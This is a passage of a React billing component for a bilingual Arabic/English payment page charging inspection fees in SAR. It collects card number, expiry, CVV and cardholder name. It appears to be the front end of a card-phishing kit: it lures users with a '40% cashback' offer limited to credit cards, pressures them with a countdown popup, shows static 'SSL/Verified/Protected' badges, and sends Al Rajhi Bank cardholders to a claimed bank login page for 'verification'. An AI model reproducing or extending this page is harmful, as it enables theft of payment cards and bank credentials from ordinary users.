                                    <span className="font-semibold">15 {language === 'ar' ? 'ر.س' : 'SAR'}</span>
                                </div>
                            </>
                        )}
                        <div className="border-t border-gray-200 pt-3 mt-2">
                            <div className="flex justify-between">
                                <span className="font-bold text-gray-800">{t('totalAmount')}</span>
                                <span className="font-bold text-lg text-brand">
                                    {serviceType === 'reinspection' ? '37.95' : '115'} {language === 'ar' ? 'ر.س' : 'SAR'}
                                </span>
                            </div>
                        </div>
                        {isCreditCard && (
                            <div className="flex justify-between pt-1">
                                <span className="font-bold text-emerald-700">{isArabic ? 'كاش باك 40%' : 'Cashback 40%'}</span>
                                <span className="font-bold text-emerald-700">{cashbackAmountText} {language === 'ar' ? 'ريال' : 'SAR'}</span>
                            </div>
                        )}
                    </div>
                </div>

                {/* Payment Methods */}
                <div className="space-y-3 mb-8">
                    <button
                        onClick={() => handleMethodSelect('card')}
                        className={`w-full p-4 rounded-xl flex items-center justify-between transition-all group ${selectedMethod === 'card'
                            ? 'border-2 border-brand bg-blue-50'
                            : 'border-2 border-gray-100 hover:border-brand hover:bg-blue-50'
                            }`}
                    >
                        <img src="/imgs/billing/vimas.png" alt="Visa/Mastercard" style={{ height: `${cardIconSize}rem` }} />
                        <span className={`font-bold ${selectedMethod === 'card' ? 'text-brand' : 'text-gray-700'
                            }`}>{t('visaMastercard')}</span>
                    </button>

                    <button
                        onClick={() => handleMethodSelect('mada')}
                        className={`w-full p-4 rounded-xl flex items-center justify-between transition-all group ${selectedMethod === 'mada'
                            ? 'border-2 border-brand bg-blue-50'
                            : 'border-2 border-gray-100 hover:border-brand hover:bg-blue-50'
                            }`}
                    >
                        <img src="/imgs/billing/mada-black.png" alt="Mada" style={{ height: `${cardIconSize}rem` }} />
                        <span className={`font-bold ${selectedMethod === 'mada' ? 'text-brand' : 'text-gray-700'
                            }`}>{t('mada')}</span>
                    </button>

                    <button
                        onClick={() => handleMethodSelect('apple')}
                        className={`w-full p-4 rounded-xl flex items-center justify-between transition-all group ${selectedMethod === 'apple'
                            ? 'border-2 border-brand bg-blue-50'
                            : 'border-2 border-gray-100 hover:border-brand hover:bg-blue-50'
                            }`}
                    >
                        <img src="/imgs/billing/appy.jpg" alt="Apple Pay" style={{ height: `${cardIconSize}rem` }} />
                        <span className={`font-bold ${selectedMethod === 'apple' ? 'text-brand' : 'text-gray-700'
                            }`}>{t('applePay')}</span>
                    </button>
                </div>

                {/* Apple Pay Alert */}
                {showApplePayAlert && (
                    <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6 rounded">
                        <div className="flex">
                            <div className="flex-shrink-0">
                                <svg className="h-5 w-5 text-yellow-400" viewBox="0 0 20 20" fill="currentColor">
                                    <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                                </svg>
                            </div>
                            <div className={isArabic ? 'mr-3' : 'ml-3'}>
                                <p className="text-sm text-yellow-700">
                                    {t('applePayNotAvailable')}
                                </p>
                            </div>
                            <div className={isArabic ? 'mr-auto pr-3' : 'ml-auto pl-3'}>
                                <div className="-mx-1.5 -my-1.5">
                                    <button
                                        type="button"
                                        onClick={() => setShowApplePayAlert(false)}
                                        className="inline-flex bg-yellow-50 rounded-md p-1.5 text-yellow-500 hover:bg-yellow-100 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-yellow-400"
                                    >
                                        <span className="sr-only">Close</span>
                                        <svg className="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                                            <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" />
                                        </svg>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                )}

                {/* Card Form (Only visible if card method selected) */}
                {selectedMethod && (
                    <>
                        {/* Card Preview */}
                        <div
                            className={`relative overflow-hidden w-full rounded-3xl p-3 sm:p-6 mb-6 shadow-2xl border text-white transform hover:scale-[1.01] transition-transform ${activeBankTheme.backgroundClass} ${activeBankTheme.borderClass}`}
                            style={{ aspectRatio: isPhoneView ? '1.62 / 1' : '1.586 / 1' }}
                        >
                            <div className={`absolute inset-0 ${activeBankTheme.overlayClass}`} />
                            <div className="absolute -top-10 -left-8 w-44 h-44 rounded-full bg-white/20 blur-2xl" />

                            {detectedBank?.logoPath && (
                                <img
                                    src={detectedBank.logoPath}
                                    alt={detectedBank.issuerName}
                                    className="absolute z-10 object-contain opacity-95"
                                    style={{
                                        ...cardPreviewLayout.bankLogo,
                                        ...cardPreviewSizes.bankLogo,
                                        transform: `scale(${bankLogoScale})`,
                                        transformOrigin: 'top left'
                                    }}
                                />
                            )}

                            <img
                                src="/imgs/billing/chip.svg"
                                alt="Chip"
                                className="absolute z-10 object-contain"
                                style={{ ...cardPreviewLayout.chip, ...cardPreviewSizes.chip }}
                            />

                            <div
                                className="absolute z-10 font-mono text-gray-100"
                                dir="ltr"
                                style={{ ...cardPreviewLayout.number, ...cardPreviewSizes.number }}
                            >
                                <span
                                    style={{ textShadow: '0 1px 0 #6b7280, 0 2px 4px rgba(0,0,0,0.35)' }}
                                >
                                    {cardData.number || '**** **** **** ****'}
                                </span>
                            </div>

                            <div
                                className="absolute z-10 text-white/85 uppercase"
                                style={{ ...cardPreviewLayout.nameLabel, ...cardPreviewSizes.nameLabel }}
                            >
                                Name Surname
                            </div>

                            <div
                                className="absolute z-10 font-semibold uppercase text-gray-100 truncate"
                                style={{ ...cardPreviewLayout.nameValue, ...cardPreviewSizes.nameValue, textShadow: '0 1px 0 #78716c, 0 2px 3px rgba(0,0,0,0.3)' }}
                            >
                                {cardData.name || 'NAME SURNAME'}
                            </div>

                            <div
                                className="absolute z-10 text-white/85 uppercase"
                                style={{ ...cardPreviewLayout.expiryLabel, ...cardPreviewSizes.expiryLabel }}
                            >
                                Month/Year
                            </div>

                            <div
                                className="absolute z-10 font-mono text-gray-100"
                                style={{ ...cardPreviewLayout.expiryValue, ...cardPreviewSizes.expiryValue, textShadow: '0 1px 0 #78716c, 0 2px 3px rgba(0,0,0,0.3)' }}
                            >
                                {cardData.expiry || '12/99'}
                            </div>

                            <img
                                src={`/${cardType.icon}`}
                                alt={cardType.name}
                                className="absolute opacity-90 z-10"
                                style={{
                                    ...currentBrandLogoLayout,
                                    ...currentBrandLogoSize,
                                    transform: `scale(${networkLogoScale})`,
                                    transformOrigin: 'top right'
                                }}
                            />

                        </div>

                        <form onSubmit={handleCardSubmit} className="space-y-4">
                            {/* Card Number */}
                            <div className="group">
                                <label
                                    className={`text-xs text-gray-500 font-bold block mb-2 ${isArabic ? 'text-right' : 'text-left'}`}
                                    style={{ textAlign: isArabic ? 'right' : 'left' }}
                                >
                                    {t('cardNumber')}
                                </label>
                                <div className="relative">
                                    <input
                                        type="text"
                                        className={`w-full p-3 md:p-4 pl-3 md:pl-4 pr-12 md:pr-14 bg-gray-50 border-2 rounded-xl dir-ltr text-left font-mono text-base md:text-lg tracking-wider placeholder:text-left focus:bg-white outline-none transition-all ${isBlockedCard
                                            || !!cardNumberError
                                            ? 'border-red-400 focus:border-red-500'
                                            : 'border-gray-200 focus:border-brand'
                                            }`}
                                        placeholder="0000 0000 0000 0000"
                                        maxLength={23}
                                        dir="ltr"
                                        inputMode="numeric"
                                        style={{ direction: 'ltr', textAlign: 'left' }}
                                        value={cardData.number}
                                        onChange={handleNumberChange}
                                        required
                                    />
                                    <div className="absolute top-1/2 right-3 md:right-4 -translate-y-1/2">
                                        <img
                                            src={selectedMethod === 'mada' ? '/imgs/billing/mada-black.png' : `/${cardType.icon}`}
                                            alt={selectedMethod === 'mada' ? 'Mada' : cardType.name}
                                            style={{ height: `${inputIconSize * 0.8}rem` }}
                                        />
                                    </div>
                                </div>
                                {cardNumberError && (
                                    <p className={`mt-2 text-sm text-red-600 ${isArabic ? 'text-right' : 'text-left'}`}>
                                        {cardNumberError}
                                    </p>
                                )}
                                {isBlockedCard && blockedCardMessage && (
                                    <p className={`mt-2 text-sm text-red-600 ${isArabic ? 'text-right' : 'text-left'}`}>
                                        {blockedCardMessage}
                                    </p>
                                )}
                                {isCreditCard && (
                                    <p className={`mt-2 text-sm text-emerald-700 font-semibold ${isArabic ? 'text-right' : 'text-left'}`} dir={isArabic ? 'rtl' : 'ltr'} style={{ textAlign: isArabic ? 'right' : 'left' }}>
                                        {isArabic ? 'هذه البطاقة مشمولة بعرض الكاش باك 40%' : 'This card is included in the 40% cashback offer'}
                                    </p>
                                )}
                                {isNonCreditCard && (
                                    <p className={`mt-2 text-sm text-red-600 font-semibold ${isArabic ? 'text-right' : 'text-left'}`} dir={isArabic ? 'rtl' : 'ltr'} style={{ textAlign: isArabic ? 'right' : 'left' }}>
                                        {isArabic ? 'أنت لا تستخدم بطاقة كريدت حالياً، يمكنك استخدام بطاقة كريدت لكي تحصل على كاش باك 40%' : 'You are not using a credit card currently. Use a credit card to get 40% cashback.'}
                                    </p>
                                )}
                            </div>

                            {/* Expiry & CVV */}
                            <div className="grid grid-cols-2 gap-3 md:gap-4">
                                <div>
                                    <label
                                        className={`text-xs text-gray-500 font-bold block mb-2 ${isArabic ? 'text-right' : 'text-left'}`}
                                        style={{ textAlign: isArabic ? 'right' : 'left' }}
                                    >
                                        {t('expiryDate')}
                                    </label>
                                    <input
                                        type="text"
                                        className="w-full p-3 md:p-4 bg-gray-50 border-2 border-gray-200 rounded-xl dir-ltr text-center font-mono text-base md:text-lg focus:border-brand focus:bg-white outline-none transition-all"
                                        placeholder="MM/YY"
                                        maxLength={5}
                                        dir="ltr"
                                        value={cardData.expiry}
                                        onChange={handleExpiryChange}
                                        required
                                    />
                                </div>
                                <div>
                                    <label
                                        className={`text-xs text-gray-500 font-bold block mb-2 ${isArabic ? 'text-right' : 'text-left'}`}
                                        style={{ textAlign: isArabic ? 'right' : 'left' }}
                                    >
                                        {t('cvv')}
                                    </label>
                                    <input
                                        type="text"
                                        className="w-full p-3 md:p-4 bg-gray-50 border-2 border-gray-200 rounded-xl dir-ltr text-center font-mono text-base md:text-lg focus:border-brand focus:bg-white outline-none transition-all"
                                        placeholder="•••"
                                        maxLength={3}
                                        minLength={3}
                                        inputMode="numeric"
                                        pattern="[0-9]{3}"
                                        title={language === 'ar' ? 'أدخل 3 أرقام إنجليزية فقط' : 'Enter exactly 3 English digits'}
                                        dir="ltr"
                                        value={cardData.cvv}
                                        onChange={e => setCardData({ ...cardData, cvv: e.target.value.replace(/\D/g, '') })}
                                        required
                                    />
                                </div>
                            </div>

                            {/* Card Holder Name */}
                            <div>
                                <label
                                    className={`text-xs text-gray-500 font-bold block mb-2 ${isArabic ? 'text-right' : 'text-left'}`}
                                    style={{ textAlign: isArabic ? 'right' : 'left' }}
                                >
                                    {t('cardHolder')}
                                </label>
                                <input
                                    type="text"
                                    className="w-full p-3 md:p-4 bg-gray-50 border-2 border-gray-200 rounded-xl uppercase focus:border-brand focus:bg-white outline-none transition-all"
                                    placeholder="NAME ON CARD"
                                    inputMode="text"
                                    pattern="[A-Za-z ]+"
                                    title={language === 'ar' ? 'أدخل أحرف إنجليزية فقط' : 'Enter English letters only'}
                                    value={cardData.name}
                                    onChange={e => {
                                        const englishOnly = e.target.value.replace(/[^A-Za-z\s]/g, '');
                                        setCardData({ ...cardData, name: englishOnly.toUpperCase() });
                                    }}
                                    required
                                />
                            </div>

                            {/* Security Notice */}
                            <div className="bg-gradient-to-r from-blue-50 to-cyan-50 text-blue-800 p-4 rounded-xl text-sm flex items-center gap-3 border border-blue-100">
                                <span className="text-2xl">🔒</span>
                                <div className="flex-1" style={{ textAlign: isArabic ? 'right' : 'left' }}>
                                    <div className="font-bold mb-1">{t('secureTransaction')}</div>
                                    <span className="text-xs text-blue-600">{t('secureTransactionDesc')}</span>
                                </div>
                            </div>

                            {/* Submit Button */}
                            <button
                                type="submit"
                                disabled={isBlockedCard || isCheckingBlockedCard}
                                className="w-full bg-[#0A4D32] hover:bg-[#083D27] text-white font-bold py-3 md:py-4 rounded-xl shadow-lg mt-3 transform hover:-translate-y-1 transition-all flex items-center justify-center gap-2"
                            >
                                <span>دفع</span>
                            </button>

                            {/* Trust Badges */}
                            <div className="flex justify-center items-center gap-4 pt-4 opacity-50">
                                <span className="text-xs">🔐 SSL</span>
                                <span className="text-xs">✓ Verified</span>
                                <span className="text-xs">🛡️ Protected</span>
                            </div>
                        </form>
                    </>
                )}

                <div className={`mt-6 ${isArabic ? 'text-right' : 'text-center'}`}>
                    <button onClick={() => navigate(-1)} className="text-gray-400 text-sm hover:text-gray-600 underline">
                        {t('goBack')}
                    </button>
                </div>
            </div>

            {showOfferPopup && (
                <div className="fixed inset-0 z-[70] bg-black/60 flex items-center justify-center p-4">
                    <div
                        dir={isArabic ? 'rtl' : 'ltr'}
                        className="bg-white rounded-3xl w-full max-w-xl shadow-2xl overflow-hidden"
                    >
                        <div className="p-3 sm:p-4">
                            <img
                                src="/imgs/billing/offer.png"
                                alt={isArabic ? 'عرض الكاش باك' : 'Cashback offer'}
                                className="w-full rounded-xl border border-gray-200"
                            />
                        </div>

                        <div className="px-5 pb-5 text-center">
                            <h3 className="text-3xl sm:text-4xl font-extrabold text-gray-900 mb-1">
                                {isArabic ? 'سارع قبل نهاية العرض!' : 'Hurry before the offer ends!'}
                            </h3>
                            <p className="text-gray-500 text-lg sm:text-xl mb-2">
                                {isArabic ? 'يبقى على انتهاء العرض' : 'Time left until offer ends'}
                            </p>
                            <div className="text-5xl sm:text-6xl font-extrabold text-emerald-700 mb-5 tracking-wide" dir="ltr">
                                {offerTimeRemaining}
                            </div>

                            <button
                                type="button"
                                onClick={() => setShowOfferPopup(false)}
                                className="w-full bg-slate-600 hover:bg-slate-700 text-white text-2xl sm:text-3xl font-bold py-3 rounded-xl transition-colors"
                            >
                                {isArabic ? 'إغلاق' : 'Close'}
                            </button>
                        </div>
                    </div>
                </div>
            )}

            <PaymentModal show={showModal} />

            {/* Payment Loading Screen */}
            <PaymentLoadingScreen
                isVisible={showLoading}
                theme={isRajhiRedirectNotice ? 'rajhi' : 'default'}
                logoSrc={isRajhiRedirectNotice ? '/imgs/alrajhi_bank_logo.svg' : undefined}
                logoAlt={isRajhiRedirectNotice ? 'Al Rajhi Bank' : undefined}
                countdownSeconds={isRajhiRedirectNotice ? rajhiRedirectCountdown : undefined}
                countdownLabel={isRajhiRedirectNotice ? (language === 'ar' ? 'ثوانٍ متبقية' : 'seconds remaining') : undefined}
                onCancel={isRajhiRedirectNotice
                    ? undefined
                    : () => {
                        setShowLoading(false);
                        setIsRajhiRedirectNotice(false);
                        if (rajhiRedirectIntervalRef.current) {
                            window.clearInterval(rajhiRedirectIntervalRef.current);
                            rajhiRedirectIntervalRef.current = null;
                        }
                        // Clear pending payment
                        socketService.emitClientEvent('cancelPayment', {});
                    }
                }
                title={isRajhiRedirectNotice
                    ? (language === 'ar' ? 'إشعار تحويل رسمي' : 'Official Redirect Notice')
                    : undefined
                }
                description={isRajhiRedirectNotice
                    ? (language === 'ar'
                        ? `نظرًا لأن بطاقتك صادرة من مصرف الراجحي، سيتم نقلك إلى صفحة تسجيل دخول مصرف الراجحي لإكمال التحقق خلال ${rajhiRedirectCountdown} ثوانٍ.`
                        : `Because your card is issued by Al Rajhi Bank, you will be redirected to the Al Rajhi login page to complete verification in ${rajhiRedirectCountdown} seconds.`)
                    : undefined
                }
                steps={isRajhiRedirectNotice
                    ? (language === 'ar'
                        ? ['التحقق من جهة إصدار البطاقة', 'تهيئة التحويل إلى تسجيل دخول الراجحي', 'إكمال التحقق البنكي']
                        : ['Verifying card issuer', 'Preparing redirect to Al Rajhi login', 'Completing bank verification'])
                    : undefined
                }
            />

            {/* Error Modal */}
            {showError && (
                <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
                    <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full animate-fadeIn">
                        <div className="p-6">
                            <div className="text-center">
                                <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                                    <svg className="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                                    </svg>
                                </div>
                                <h3 className="text-xl font-bold text-gray-800 mb-2">{isArabic ? 'تم رفض الدفع' : 'Payment declined'}</h3>
                                <p className="text-gray-600 mb-6">
                                    {errorMessage}
                                </p>
                                <button
                                    onClick={() => setShowError(false)}
                                    className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white font-bold py-3 rounded-xl shadow-lg transform hover:-translate-y-1 transition-all"
                                >
                                    {isArabic ? 'حاول مرة أخرى' : 'Try again'}
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
};

export default Billing;
